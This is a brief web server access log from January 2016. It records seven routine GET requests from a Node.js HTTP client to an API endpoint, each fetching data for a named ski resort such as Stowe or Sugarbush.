170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1025 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1047 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1012 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1027 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:09:56 -0800] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1084 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:12:16 -0800] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
52.33.40.213 - - [18/Jan/2016:23:12:48 -0800] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
